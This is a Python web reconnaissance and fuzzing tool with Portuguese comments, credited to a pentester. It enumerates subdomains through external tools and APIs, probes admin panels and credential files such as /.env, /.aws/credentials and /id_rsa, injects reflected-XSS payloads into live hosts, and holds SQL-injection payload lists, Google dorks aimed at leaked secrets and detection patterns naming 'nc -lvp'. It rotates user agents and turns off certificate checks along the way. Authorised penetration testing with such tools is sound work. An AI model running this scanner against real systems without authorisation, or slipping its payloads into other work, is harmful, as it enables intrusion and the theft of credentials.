#!/usr/bin/env python3
import subprocess
import requests
import sys
import os
import concurrent.futures
import socket
import ssl
import json
import re
import time
import random
import string
import shutil
import argparse
from datetime import datetime
from urllib.parse import urlparse
import dns.resolver

# ===== CONFIGURAÇÕES AVANÇADAS =====
OUTPUT_DIR = "recon_results"
SCREENSHOTS_DIR = os.path.join(OUTPUT_DIR, "screenshots")
os.makedirs(OUTPUT_DIR, exist_ok=True)
os.makedirs(SCREENSHOTS_DIR, exist_ok=True)

# Wordlists
COMMON_SUBDOMAINS = [
    "www", "mail", "ftp", "webmail", "admin", "portal", "api", 
    "test", "dev", "staging", "blog", "app", "mobile", "secure", 
    "vpn", "crm", "shop", "cdn", "login", "auth", "oauth", "sso",
    "m", "web", "static", "assets", "beta", "staging", "support"
]

ADMIN_PATHS = [
    "/admin", "/wp-admin", "/wp-login.php", "/administrator", 
    "/manager", "/login", "/auth", "/signin", "/controlpanel",
    "/adminpanel", "/cpanel", "/secure", "/console", "/backoffice",
    "/system", "/user", "/account", "/dashboard", "/root"
]

SENSITIVE_PATHS = [
    "/.env", "/.git/config", "/.aws/credentials", "/.htaccess",
    "/.git/HEAD", "/.svn/entries", "/debug.log", "/phpinfo.php",
    "/.well-known/security.txt", "/config.php", "/web.config",
    "/server-status", "/storage/logs/laravel.log", "/backup.zip",
    "/dump.sql", "/backup.tar.gz", "/credentials.json", "/id_rsa",
    "/id_rsa.pub", "/.npmrc", "/.dockercfg", "/.bash_history"
]

# Configurações técnicas
THREADS = 20
TIMEOUT = 10
CUSTOM_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
}

# Configurações de API
API_KEYS = {
    "SECURITYTRAILS": os.getenv("SECURITYTRAILS_API_KEY", ""), # Colocar aqui SUA API 
    "SHODAN": os.getenv("SHODAN_API_KEY", ""), # Colocar aqui SUA API 
    "GOOGLE_API_KEY": os.getenv("GOOGLE_API_KEY", ""), # Colocar aqui SUA API 
    "GOOGLE_CSE_ID": os.getenv("GOOGLE_CSE_ID", "") # Colocar aqui SUA API 
}

# Payloads por tecnologia
PAYLOADS = {
    "XSS": {
        "generic": [
            "<script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "onerror=alert('XSS')"
        ],
        "php": [
            "<?php echo 'XSS'; ?>",
            "${alert('XSS')}"
        ],
        "nodejs": [
            "{{= 'XSS' }}",
            "<%= 'XSS' %>"
        ],
        "nextjs": [
            "{`${alert('XSS')}`}",
            "{alert('XSS')}"
        ],
        "angular": [
            "{{constructor.constructor('alert(1)')()}}"
        ]
    },
    "SQLi": {
        "generic": [
            "' OR 1=1--",
            "' OR 'a'='a",
            "\" OR \"\"=\"",
            "' OR 1=1#"
        ],
        "mysql": [
            "' OR SLEEP(5)--"
        ],
        "mssql": [
            "' WAITFOR DELAY '0:0:5'--"
        ]
    }
}

# Assinaturas de vulnerabilidades
VULN_SIGNATURES = {
    "SQL_INJECTION": r"SQL syntax.*MySQL|Warning.*mysql_|unclosed quotation mark|syntax error",
    "XSS": r"<script>alert\(|onerror=.?alert\(|javascript:|alert\(",
    "RCE": r"sh:.*command not found|bin/bash|www.shell.com|nc -lvp",
    "LFI": r"root:/etc/passwd|Failed opening.*for inclusion|etc/shadow",
    "DEBUG_MODE": r"DEBUG_MODE.*true|APP_DEBUG.*true|debug.*true",
    "CREDS_LEAK": r"API_KEY|API_SECRET|AWS_ACCESS_KEY|AWS_SECRET_ACCESS_KEY|DATABASE_URL|DB_PASSWORD|SECRET_KEY",
    "CORS_MISCONFIG": r"Access-Control-Allow-Origin: \*"
}

LOGIN_INDICATORS = [
    "login", "sign in", "username", "password", "email", "log in", 
    "signin", "auth", "authentication", "credentials", "acessar conta",
    "entrar", "senha", "usuário", "user", "pass", "pwd"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
]

def banner():
    print("=" * 70)
    print(" 🔍 RECON WEB PROFISSIONAL - SUBDOMÍNIOS + FUZZING + VULN CHECKS")
    print(f" By Pentester Caio | CHDEVSEC | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)

def get_random_agent():
    """Retorna um User-Agent aleatório"""
    return random.choice(USER_AGENTS)

def is_tool_installed(name):
    """Verifica se uma ferramenta está instalada"""
    return shutil.which(name) is not None

def run_recon_tools(domain):
    """Executa ferramentas de descoberta de subdomínios"""
    print(f"\n[+] Coletando subdomínios...")
    subdomains = set()
    tools_ran = 0
    
    # Ferramentas externas (verifica instalação)
    tools = {
        "subfinder": ["subfinder", "-d", domain, "-silent"],
        "assetfinder": ["assetfinder", "--subs-only", domain],
        "amass": ["amass", "enum", "-passive", "-d", domain],
        "findomain": ["findomain", "-t", domain, "--quiet"]
    }

    for tool, command in tools.items():
        if not is_tool_installed(command[0]):
            print(f"  ⚠️ {tool} não está instalado. Pulando...")
            continue
            
        try:
            print(f"  🔍 Executando {tool}...")
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=120
            )
            if result.stdout:
                new_subs = {s.strip() for s in result.stdout.splitlines() if s.strip() and domain in s}
                subdomains.update(new_subs)
                print(f"    ✅ {len(new_subs)} subdomínios encontrados")
                tools_ran += 1
        except Exception as e:
            print(f"    ⚠️ Erro com {tool}: {str(e)}")
    
    # APIs
    if API_KEYS["SECURITYTRAILS"]:
        securitytrails_subs = query_securitytrails_api(domain)
        subdomains.update(securitytrails_subs)
        tools_ran += 1
    
    crtsh_subs = query_crtsh(domain)
    if crtsh_subs:
        subdomains.update(crtsh_subs)
        tools_ran += 1
    
    # Shodan para subdomínios (se API estiver configurada)
    if API_KEYS["SHODAN"]:
        shodan_subs = query_shodan_domain(domain)
        if shodan_subs:
            subdomains.update(shodan_subs)
            tools_ran += 1
    
    # DNS Brute Force (só se poucas ferramentas rodaram)
    if tools_ran < 2:
        print(f"  🔍 Realizando brute force DNS com {len(COMMON_SUBDOMAINS)} subdomínios comuns...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = {executor.submit(resolve_dns, f"{sub}.{domain}"): sub for sub in COMMON_SUBDOMAINS}
            for future in concurrent.futures.as_completed(futures):
                if future.result():
                    subdomains.add(future.result())
    
    # Garantir que o domínio principal está incluído
    subdomains.add(domain)
    
    # Remover duplicatas e invalidados
    subdomains = {s for s in subdomains if s.endswith(domain)}
    
    print(f"\n[+] Total de subdomínios encontrados: {len(subdomains)}")
    return list(subdomains)

def query_securitytrails_api(domain):
    """Consulta a API do SecurityTrails para subdomínios"""
    subdomains = set()
    
    try:
        print("  🔍 Consultando API SecurityTrails...")
        url = f"https://api.securitytrails.com/v1/domain/{domain}/subdomains"
        params = {"children_only": "true", "include_inactive": "false"}
        headers = {"Accept": "application/json", "APIKEY": API_KEYS["SECURITYTRAILS"]}
        
        response = requests.get(url, headers=headers, params=params, timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            subs = data.get("subdomains", [])
            full_subs = {f"{sub}.{domain}" for sub in subs}
            print(f"    ✅ {len(full_subs)} subdomínios encontrados")
            return full_subs
        else:
            print(f"    ⚠️ Erro na API SecurityTrails: {response.status_code}")
            
    except Exception as e:
        print(f"    ⚠️ Falha na conexão com SecurityTrails: {str(e)}")
    
    return subdomains

def query_crtsh(domain):
    """Consulta certificados SSL via crt.sh"""
    subdomains = set()
    try:
        print("  🔍 Consultando crt.sh...")
        url = f"https://crt.sh/?q=%.{domain}&output=json"
        response = requests.get(url, timeout=TIMEOUT)
        data = response.json()
        
        for item in data:
            name = item["name_value"]
            if name.startswith("*."):
                base_domain = name.replace("*.", "")
                if base_domain.endswith(domain):
                    subdomains.add(base_domain)
                    for sub in COMMON_SUBDOMAINS:
                        subdomains.add(f"{sub}.{base_domain}")
            elif domain in name:
                subdomains.add(name)
        
        print(f"    ✅ {len(subdomains)} subdomínios encontrados")
    except Exception as e:
        print(f"    ⚠️ Falha na consulta ao crt.sh: {str(e)}")
    
    return subdomains

def query_shodan_domain(domain):
    """Consulta Shodan para informações de subdomínios e hosts"""
    subdomains = set()
    try:
        print("  🔍 Consultando Shodan...")
        url = f"https://api.shodan.io/dns/domain/{domain}?key={API_KEYS['SHODAN']}"
        response = requests.get(url, timeout=TIMEOUT)
        data = response.json()
        
        if 'subdomains' in data:
            for sub in data['subdomains']:
                subdomains.add(f"{sub}.{domain}")
        
        print(f"    ✅ {len(subdomains)} subdomínios encontrados")
    except Exception as e:
        print(f"    ⚠️ Falha na consulta ao Shodan: {str(e)}")
    
    return subdomains

def query_shodan_host(ip):
    """Consulta Shodan para informações de host"""
    try:
        if not API_KEYS["SHODAN"]:
            return {}
            
        url = f"https://api.shodan.io/shodan/host/{ip}?key={API_KEYS['SHODAN']}"
        response = requests.get(url, timeout=TIMEOUT)
        return response.json()
    except:
        return {}

def resolve_dns(hostname):
    """Resolução DNS para verificação de subdomínios"""
    try:
        resolver = dns.resolver.Resolver()
        resolver.timeout = 3
        resolver.lifetime = 3
        resolver.resolve(hostname, 'A')
        return hostname
    except:
        return None

def check_subdomain_alive(subdomain):
    """Verifica se subdomínio está ativo"""
    protocols = ["https://", "http://"]
    
    for protocol in protocols:
        url = f"{protocol}{subdomain}"
        try:
            # Usar User-Agent aleatório
            headers = CUSTOM_HEADERS.copy()
            headers["User-Agent"] = get_random_agent()
            
            response = requests.get(
                url,
                headers=headers,
                timeout=TIMEOUT,
                allow_redirects=True,
                verify=False
            )
            
            if response.status_code < 500:
                tech = detect_technology(response)
                title = extract_title(response)
                has_login = detect_login_page(response)
                
                print(f"  ✅ [LIVE] {url} ({response.status_code}) | {tech}")
                return {
                    "url": url,
                    "status": response.status_code,
                    "tech": tech,
                    "title": title,
                    "ip": resolve_ip(subdomain),
                    "ssl": get_ssl_info(subdomain),
                    "login_detected": has_login
                }
                
        except requests.exceptions.SSLError:
            # Tenta sem SSL
            try:
                url = url.replace("https://", "http://")
                headers = CUSTOM_HEADERS.copy()
                headers["User-Agent"] = get_random_agent()
                
                response = requests.get(
                    url,
                    headers=headers,
                    timeout=TIMEOUT,
                    allow_redirects=True
                )
                if response.status_code < 500:
                    tech = detect_technology(response)
                    title = extract_title(response)
                    has_login = detect_login_page(response)
                    
                    print(f"  ✅ [LIVE] {url} (HTTP Fallback) | {tech}")
                    return {
                        "url": url,
                        "status": response.status_code,
                        "tech": tech,
                        "title": title,
                        "ip": resolve_ip(subdomain),
                        "ssl": "SSL Failed",
                        "login_detected": has_login
                    }
            except:
                continue
        except:
            continue
    
    return None

def detect_technology(response):
    """Detecta tecnologias usadas"""
    tech = []
    headers = response.headers
    
    # Headers
    if 'server' in headers:
        tech.append(headers['server'])
    if 'x-powered-by' in headers:
        tech.append(headers['x-powered-by'])
    if 'x-aspnet-version' in headers:
        tech.append("ASP.NET")
    
    # Conteúdo
    content = response.text.lower()
    tech_flags = {
        "wordpress": "wp-content|wp-includes|wordpress",
        "drupal": "drupal|sites/all",
        "joomla": "joomla",
        "laravel": "laravel",
        "react": "react|next.js",
        "vue": "vue.js",
        "angular": "angular",
        "django": "django",
        "flask": "flask",
        "ruby": "ruby|rails",
        "jquery": "jquery",
        "bootstrap": "bootstrap"
    }
    
    for name, pattern in tech_flags.items():
        if re.search(pattern, content):
            tech.append(name)
    
    # Cookies
    cookies = response.cookies
    for cookie in cookies:
        if "wordpress" in cookie.name.lower():
            tech.append("WordPress")
        if "drupal" in cookie.name.lower():
            tech.append("Drupal")
    
    return ", ".join(set(tech)) if tech else "Unknown"

def detect_login_page(response):
    """Detecta páginas de login"""
    content = response.text.lower()
    
    # Verifica por indicadores de login
    for indicator in LOGIN_INDICATORS:
        if indicator in content:
            return True
    
    # Verifica formulários de login
    if "<form" in content and ("password" in content or "senha" in content):
        return True
    
    # Verifica botões de login
    if "login" in content or "sign in" in content or "entrar" in content:
        return True
    
    return False

def extract_title(response):
    """Extrai título da página HTML"""
    try:
        title_match = re.search(r'<title>(.*?)</title>', response.text, re.IGNORECASE)
        return title_match.group(1).strip() if title_match else "No Title"
    except:
        return "Error Extracting Title"

def resolve_ip(domain):
    """Resolve IP do domínio"""
    try:
        return socket.gethostbyname(domain)
    except socket.gaierror:
        return "N/A"

def get_ssl_info(domain):
    """Coleta informações do certificado SSL"""
    try:
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=TIMEOUT) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                issuer = dict(x[0] for x in cert['issuer'])['organizationName']
                return f"{issuer}"
    except:
        return "No SSL/TLS"

def scan_vulnerabilities(response, tech_type=None):
    """Detecta vulnerabilidades baseadas em respostas"""
    detected = []
    content = response.text
    headers = str(response.headers).lower()
    
    for vuln, pattern in VULN_SIGNATURES.items():
        if re.search(pattern, content, re.IGNORECASE) or re.search(pattern, headers, re.IGNORECASE):
            detected.append(vuln)
    
    return detected

def fuzz_url(url, tech_type=None):
    """Realiza fuzzing em um URL com payloads específicos por tecnologia"""
    findings = []
    
    # Fuzzing de paths administrativos
    for path in ADMIN_PATHS:
        full_url = url.rstrip("/") + path
        result = check_sensitive_path(full_url, tech_type)
        if result:
            findings.append(result)
    
    # Fuzzing de paths sensíveis
    for path in SENSITIVE_PATHS:
        full_url = url.rstrip("/") + path
        result = check_sensitive_path(full_url, tech_type)
        if result:
            findings.append(result)
    
    # Verificação de arquivos comuns
    for ext in [".bak", ".old", ".tmp", ".swp"]:
        for file in ["index", "config", "backup"]:
            full_url = url.rstrip("/") + f"/{file}{ext}"
            result = check_sensitive_path(full_url, tech_type)
            if result:
                findings.append(result)
    
    # Busca por páginas de login
    login_paths = ["/login", "/signin", "/admin", "/wp-login.php", "/auth"]
    for path in login_paths:
        full_url = url.rstrip("/") + path
        result = check_login_page(full_url, tech_type)
        if result:
            findings.append(result)
    
    # Testar payloads de XSS se a tecnologia for fornecida
    if tech_type:
        print(f"  🔍 Testando payloads de XSS para {tech_type}...")
        xss_payloads = PAYLOADS["XSS"].get(tech_type, []) + PAYLOADS["XSS"]["generic"]
        for payload in xss_payloads:
            test_url = url + f"?test={payload}"
            result = test_xss(test_url, payload)
            if result:
                findings.append(result)
    
    return findings

def test_xss(url, payload):
    """Testa um payload XSS específico"""
    try:
        headers = CUSTOM_HEADERS.copy()
        headers["User-Agent"] = get_random_agent()
        
        response = requests.get(
            url,
            headers=headers,
            timeout=TIMEOUT,
            allow_redirects=True,
            verify=False
        )
        
        # Verifica se o payload está refletido na resposta
        if payload in response.text:
            return {
                "url": url,
                "status": response.status_code,
                "content_type": response.headers.get('Content-Type', ''),
                "length": len(response.content),
                "tech": detect_technology(response),
                "vulnerabilities": ["XSS_REFLECTED"],
                "is_login": False,
                "payload": payload
            }
    except:
        return None

def check_sensitive_path(url, tech_type=None):
    """Verifica um caminho sensível"""
    try:
        # Usar User-Agent aleatório
        headers = CUSTOM_HEADERS.copy()
        headers["User-Agent"] = get_random_agent()
        
        response = requests.get(
            url,
            headers=headers,
            timeout=TIMEOUT,
            allow_redirects=True,
            verify=False
        )
        
        if response.status_code < 400 and not is_irrelevant(response):
            # Detecta vulnerabilidades
            vulnerabilities = scan_vulnerabilities(response, tech_type)
            
            return {
                "url": url,
                "status": response.status_code,
                "content_type": response.headers.get('Content-Type', ''),
                "length": len(response.content),
                "tech": detect_technology(response),
                "vulnerabilities": vulnerabilities,
                "is_login": False
            }
    
    except:
        return None

def check_login_page(url, tech_type=None):
    """Verifica se é uma página de login válida"""
    try:
        headers = CUSTOM_HEADERS.copy()
        headers["User-Agent"] = get_random_agent()
        
        response = requests.get(
            url,
            headers=headers,
            timeout=TIMEOUT,
            allow_redirects=True,
            verify=False
        )
        
        if response.status_code < 400 and detect_login_page(response):
            return {
                "url": url,
                "status": response.status_code,
                "content_type": response.headers.get('Content-Type', ''),
                "length": len(response.content),
                "tech": detect_technology(response),
                "vulnerabilities": [],
                "is_login": True
            }
    
    except:
        return None

def is_irrelevant(response):
    """Filtra respostas irrelevantes"""
    if len(response.content) < 100:
        return True
    
    # Ignora páginas de erro
    error_codes = [400, 401, 402, 403, 404, 405, 500, 501, 502, 503]
    if response.status_code in error_codes:
        return True
    
    error_indicators = [
        "page not found", "404 error", "not found", "access denied",
        "403 forbidden", "401 unauthorized", "error", "not exist"
    ]
    
    content = response.text.lower()
    for indicator in error_indicators:
        if indicator in content:
            return True
    
    return False

def google_dork_search(domain, dork_type="all"):
    """Executa Google Dorks para o domínio"""
    print(f"\n[+] Executando Google Dorks para {domain}...")
    results = []
    
    # Dorks para páginas de login
    if dork_type in ["all", "login"]:
        login_dorks = [
            f"site:{domain} inurl:login OR inurl:signin OR inurl:auth OR inurl:admin",
            f"site:{domain} intitle:\"login\" OR intitle:\"sign in\" OR intitle:\"admin\"",
            f"site:{domain} intext:\"login\" intext:\"password\"",
            f"site:{domain} intext:\"username\" intext:\"password\"",
            f"site:{domain} filetype:php inurl:login"
        ]
        results.extend(run_dorks(login_dorks, "Login Pages"))
    
    # Dorks para arquivos sensíveis
    if dork_type in ["all", "files"]:
        file_dorks = [
            f"site:{domain} filetype:env OR filetype:sql OR filetype:log OR filetype:bak",
            f"site:{domain} ext:env OR ext:sql OR ext:log OR ext:bak",
            f"site:{domain} inurl:\".env\" OR inurl:\"config.php\" OR inurl:\".git\"",
            f"site:{domain} \"AWS_ACCESS_KEY\" OR \"API_KEY\" OR \"SECRET_KEY\"",
            f"site:{domain} \"password\" OR \"credentials\" OR \"secret\""
        ]
        results.extend(run_dorks(file_dorks, "Sensitive Files"))
    
    # Dorks para painéis administrativos
    if dork_type in ["all", "admin"]:
        admin_dorks = [
            f"site:{domain} inurl:wp-admin OR inurl:administrator OR inurl:admin",
            f"site:{domain} intitle:\"admin\" OR intitle:\"dashboard\"",
            f"site:{domain} intext:\"admin panel\" OR intext:\"control panel\"",
            f"site:{domain} \"welcome to phpmyadmin\""
        ]
        results.extend(run_dorks(admin_dorks, "Admin Panels"))
    
    return results

def run_dorks(dorks, category):
    """Executa um conjunto de dorks"""
    results = []
    for dork in dorks:
        try:
            print(f"  🔍 Dork: {dork}")
            time.sleep(random.uniform(2, 5))  # Delay aleatório para evitar bloqueio
            
            if API_KEYS["GOOGLE_API_KEY"] and API_KEYS["GOOGLE_CSE_ID"]:
                # Usar API oficial do Google
                url = "https://www.googleapis.com/customsearch/v1"
                params = {
                    "key": API_KEYS["GOOGLE_API_KEY"],
                    "cx": API_KEYS["GOOGLE_CSE_ID"],
                    "q": dork,
                    "num": 5  # Limitar a 5 resultados
                }
                response = requests.get(url, params=params, timeout=TIMEOUT)
                data = response.json()
                
                items = data.get("items", [])
                links = [item["link"] for item in items]
            else:
                # Fallback para scraping básico (com rotação de User-Agent)
                url = f"https://www.google.com/search?q={dork.replace(' ', '+')}"
                headers = CUSTOM_HEADERS.copy()
                headers["User-Agent"] = get_random_agent()
                
                response = requests.get(url, headers=headers, timeout=TIMEOUT)
                if response.status_code != 200:
                    print(f"    ⚠️ Google bloqueou a requisição. Status: {response.status_code}")
                    continue
                    
                # Extrai links dos resultados
                links = re.findall(r'<a href="(https?://[^"]+)"', response.text)
                links = [link for link in links if "google.com" not in link][:5]  # Limitar a 5
            
            if links:
                results.append({
                    "dork": dork,
                    "category": category,
                    "links": links
                })
                print(f"    ✅ Encontrados {len(links)} resultados")
            else:
                print("    ⚠️ Nenhum resultado encontrado")
            
        except Exception as e:
            print(f"    ⚠️ Erro: {str(e)}")
    
    return results

def generate_html_report(domain, live_subs, findings, dork_results):
    """Gera relatório HTML profissional"""
    report_path = os.path.join(OUTPUT_DIR, f"recon_report_{domain}.html")
    
    # Seção de subdomínios
    subs_html = ""
    for sub in live_subs:
        login_badge = '<span class="badge red">LOGIN PAGE</span>' if sub["login_detected"] else ""
        subs_html += f"""
        <tr>
            <td><a href="{sub['url']}" target="_blank">{sub['url']}</a> {login_badge}</td>
            <td>{sub['status']}</td>
            <td>{sub['ip']}</td>
            <td>{sub['tech']}</td>
            <td>{sub['title']}</td>
        </tr>
        """
    
    # Seção de findings
    findings_html = ""
    for finding in findings:
        vulns = ""
        if finding.get("vulnerabilities"):
            vulns = "<br>" + "<br>".join([f'<span class="vuln">{v}</span>' for v in finding["vulnerabilities"]])
        
        login_badge = '<span class="badge red">LOGIN PAGE</span>' if finding.get("is_login", False) else ""
        
        # Mostrar payload se existir
        payload_info = ""
        if finding.get("payload"):
            payload_info = f"<br><strong>Payload:</strong> {finding['payload']}"
        
        findings_html += f"""
        <tr>
            <td><a href="{finding['url']}" target="_blank">{finding['url']}</a> {login_badge}{payload_info}</td>
            <td>{finding['status']}</td>
            <td>{finding['content_type']}</td>
            <td>{finding['length']} bytes</td>
            <td>{finding['tech']}{vulns}</td>
        </tr>
        """
    
    # Seção de dorks
    dorks_html = ""
    for result in dork_results:
        links_html = "<br>".join([f'<a href="{link}" target="_blank">{link}</a>' for link in result["links"]])
        dorks_html += f"""
        <div class="dork-result">
            <h3>{result['category']}: <code>{result['dork']}</code></h3>
            <div class="dork-links">{links_html}</div>
        </div>
        """
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Recon Report - {domain}</title>
        <style>
            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; }}
            .container {{ width: 90%; margin: auto; }}
            h1, h2, h3 {{ color: #2c3e50; }}
            table {{ width: 100%; border-collapse: collapse; margin-bottom: 20px; }}
            th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
            tr:hover {{ background-color: #f5f5f5; }}
            .vuln {{ color: #e74c3c; font-weight: bold; }}
            .badge {{ padding: 3px 8px; border-radius: 12px; font-size: 12px; font-weight: bold; }}
            .red {{ background-color: #ffebee; color: #c62828; }}
            .section {{ margin-top: 30px; padding: 15px; background-color: #f8f9fa; border-radius: 5px; }}
            .dork-result {{ margin-bottom: 20px; }}
            .dork-links {{ margin-left: 20px; }}
            code {{ background: #f1f1f1; padding: 2px 5px; border-radius: 3px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Relatório de Reconhecimento</h1>
            <p><strong>Alvo:</strong> {domain}</p>
            <p><strong>Data:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p><strong>Subdomínios Ativos:</strong> {len(live_subs)}</p>
            <p><strong>Paths Sensíveis Encontrados:</strong> {len(findings)}</p>
            <p><strong>Dorks com Resultados:</strong> {len(dork_results)}</p>
            
            <div class="section">
                <h2>Subdomínios Ativos</h2>
                <table>
                    <thead>
                        <tr>
                            <th>URL</th>
                            <th>Status</th>
                            <th>IP</th>
                            <th>Tecnologias</th>
                            <th>Título</th>
                        </tr>
                    </thead>
                    <tbody>
                        {subs_html}
                    </tbody>
                </table>
            </div>
            
            <div class="section">
                <h2>Paths Sensíveis Encontrados</h2>
                <table>
                    <thead>
                        <tr>
                            <th>URL</th>
                            <th>Status</th>
                            <th>Tipo</th>
                            <th>Tamanho</th>
                            <th>Tecnologias/Vulnerabilidades</th>
                        </tr>
                    </thead>
                    <tbody>
                        {findings_html}
                    </tbody>
                </table>
            </div>
            
            <div class="section">
                <h2>Google Dorks</h2>
                {dorks_html}
            </div>
            
            <div class="section">
                <h2>Recomendações</h2>
                <ul>
                    <li>Verificar manualmente todas as páginas de login identificadas</li>
                    <li>Investigar URLs com vulnerabilidades detectadas</li>
                    <li>Remover arquivos sensíveis expostos (.env, backups, etc)</li>
                    <li>Validar configurações de segurança para subdomínios críticos</li>
                    <li>Implementar WAF para proteger endpoints sensíveis</li>
                </ul>
            </div>
            
            <footer>
                <p>Relatório gerado por Recon Automatizado | Pentester Caio | CHDEVSEC</p>
            </footer>
        </div>
    </body>
    </html>
    """
    
    with open(report_path, "w") as f:
        f.write(html)
    
    return report_path

def select_technology():
    """Menu para seleção de tecnologia alvo"""
    print("\n[+] Selecione a tecnologia alvo para testes específicos:")
    print("  1. PHP")
    print("  2. Node.js")
    print("  3. Next.js")
    print("  4. Angular")
    print("  5. Django (Python)")
    print("  6. Flask (Python)")
    print("  7. Ruby on Rails")
    print("  8. Outra/Genérico")
    choice = input("  > Escolha uma opção (1-8): ").strip()
    
    tech_map = {
        "1": "php",
        "2": "nodejs",
        "3": "nextjs",
        "4": "angular",
        "5": "django",
        "6": "flask",
        "7": "ruby",
        "8": "generic"
    }
    
    return tech_map.get(choice, "generic")

def main():
    parser = argparse.ArgumentParser(description='Recon Web Profissional')
    parser.add_argument('domain', help='Domínio alvo')
    parser.add_argument('--dork-type', default='all', help='Tipo de dork (all, login, files, admin)')
    args = parser.parse_args()
    
    domain = args.domain.lower().replace("https://", "").replace("http://", "").split("/")[0]
    dork_type = args.dork_type
    
    banner()
    
    # Seleção de tecnologia
    tech_type = select_technology()
    print(f"\n[+] Tecnologia selecionada: {tech_type}")
    
    # Etapa 1: Descoberta de subdomínios
    subdomains = run_recon_tools(domain)
    
    # Etapa 2: Verificação de hosts ativos
    print(f"\n[+] Verificando subdomínios ativos com {THREADS} threads...")
    live_subs = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(check_subdomain_alive, sub): sub for sub in subdomains}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                live_subs.append(result)
    
    # Fallback para domínio principal
    if not live_subs:
        print("  ⚠️ Nenhum subdomínio ativo encontrado. Testando domínio base...")
        base_test = check_subdomain_alive(domain)
        if base_test:
            live_subs.append(base_test)
    
    # Etapa 3: Fuzzing com payloads específicos
    all_findings = []
    if live_subs:
        print(f"\n[+] Iniciando fuzzing em {len(live_subs)} hosts ativos com payloads para {tech_type}...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = [executor.submit(fuzz_url, sub['url'], tech_type) for sub in live_subs]
            for i, future in enumerate(concurrent.futures.as_completed(futures), 1):
                findings = future.result()
                if findings:
                    print(f"  [{i}/{len(live_subs)}] Encontrados {len(findings)} paths em {live_subs[i-1]['url']}")
                    all_findings.extend(findings)
    
    # Etapa 4: Google Dorks
    dork_results = google_dork_search(domain, dork_type)
    
    # Etapa 5: Geração de relatório
    report_path = generate_html_report(domain, live_subs, all_findings, dork_results)
    
    # Resumo final
    print("\n" + "=" * 70)
    print(" 🎯 RECON PROFISSIONAL FINALIZADO")
    print(f" Domínio: {domain}")
    print(f" Tecnologia: {tech_type}")
    print(f" Subdomínios Encontrados: {len(subdomains)}")
    print(f" Subdomínios Ativos: {len(live_subs)}")
    print(f" Paths Sensíveis Detectados: {len(all_findings)}")
    print(f" Dorks com Resultados: {len(dork_results)}")
    print(f"\n 🔗 Relatório HTML gerado: {report_path}")
    print("=" * 70)
    print(" Script desenvolvido por: Pentester Caio | CHDEVSEC")
    print("=" * 70)

if __name__ == "__main__":
    main()
